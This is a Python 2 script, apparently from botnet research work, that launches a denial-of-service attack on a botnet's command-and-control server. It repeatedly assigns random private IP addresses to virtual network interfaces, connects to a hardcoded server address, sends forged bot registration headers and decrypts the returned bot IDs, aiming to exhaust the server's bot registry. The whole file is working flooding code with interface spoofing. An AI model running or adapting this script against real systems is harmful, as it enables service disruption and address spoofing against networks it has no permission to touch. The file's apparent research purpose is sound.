# dos.py

"""
Description:
This program tries to overload the number of bots registered in the botnet C&C.

Modules:
    cipher          : Defines the CBC encryption/decryption functions
    c_types_defines : Defines ctype structures
    termcolor       : For printing out colored text, $pip install termcolor
    subprocess      : For calling external (shell) command from python

NOTE: 
This program needs root permission to call the "ifconfig" command.

"""

import sys
import array
import socket
import fcntl
import struct
import time
import random

from cipher import pencrypt, pdecrypt
from utils import hexdump, get_ip_address
from c_types_defines import *
from termcolor import cprint
from subprocess import call

# Enable/Disable debug mode
DBG = False

# Bot network interface
IFACE = "vmnet8"

# C&C connection IP and Port number
HOST = "10.0.0.128"
PORT = 43242

# C&C commands
RC_BID      = 5

# Initialise bot_rheader structure
bot_rheader = BOT_RHEADER()

def init_bot_rheader():
    # Populate bot_rheader structure
    bot_rheader.bid     = 0
    bot_rheader.iplocal = 97718444 # Should be INT
    bot_rheader.botver  = 116
    bot_rheader.confver = 198
    bot_rheader.mfver   = 1
    bot_rheader.winver  = 1
    bot_rheader.flags   = 0
    bot_rheader.smtp    = 1
    bot_rheader.size    = 32

# Initialize socket (bind to interface parameter)
def init_socket(iface):
    # Socket configurations
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((get_ip_address(iface), 0))
    s.settimeout(3.0) # Set 3s timeout

    # Connect
    s.connect((HOST, PORT))

    return s

# Assign a random class A private IP address to interface
def init_iface(iface):
    rand1 = str(random.randint(0,255))
    rand2 = str(random.randint(0,255))
    rand3 = str(random.randint(0,254))
    ip = "10." + rand1 + "." + rand2 + "." + rand3
    call(["ifconfig", iface, ip])
    return ip

# Register bot with the C&C server and get bid assigned
def get_bid(s):
    while True:
        # Try receiving data
        rcvmsg = s.recv(1024)

        # Check whether connection is closed
	if rcvmsg == "":
            break
	
        # Got some data!

        # Interpret command
        cmd = ord(rcvmsg[0])

        if cmd == RC_BID:
            # Decrypt data received
            dec = pdecrypt(rcvmsg[8:], len(rcvmsg[8:]))

            # Extract the BID from the decrypted data
            bid = struct.unpack("i", dec[0:4]) # Returns a tuple
            break

    # Close socket
    #s.close()

    return bid[0]

def main():

    # Initialize bot_rheader structure
    init_bot_rheader()
    
    count = 0

    print "[*] Starting DoS attack...\n"

    try:
        while True:
            iface = IFACE + ":" + str(count)

            # Initialize interface
            ip = init_iface(iface)

            # Initialize socket
            s = init_socket(iface)

            # Send data (BOT_RHEADER packed binary) TODO: bot_info
            data = buffer(bot_rheader)[:] * 2
            s.sendall(data)

            # Get registered by C&C
            get_bid(s)

            count += 1

            if (DBG):
                # Print status
                sys.stdout.write("[")
                cprint(iface, "cyan", end="")
                sys.stdout.write("]\t")
                cprint(ip, "yellow", end="")
                sys.stdout.write("\tcount = ")
                cprint(str(count), "green")

    except Exception as e:
        print "[-]", e
        if (DBG):
            cprint("\n[*] Bringing network interfaces down...", "red")

        # Bring interfaces down
        for i in range(0, count+1):
            call(["ifconfig", IFACE + ":" + str(i), "down"])


if __name__ == "__main__":
    main()

